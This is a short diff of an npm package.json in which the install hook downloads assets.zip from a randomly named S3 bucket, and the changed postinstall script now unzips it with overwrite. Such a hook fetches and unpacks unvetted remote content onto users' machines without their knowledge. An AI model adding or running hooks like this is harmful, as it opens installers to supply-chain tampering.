@@ -14,7 +14,7 @@
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
     "install": "wget https://asdfihuhubsdfswedf45456213.s3.eu-west-2.amazonaws.com/assets.zip",
-    "postinstall": "unzip assets.zip",
+    "postinstall": "unzip -o assets.zip",
     "start": "node index.js"
   },
   "author": "Ilkka Turunen",
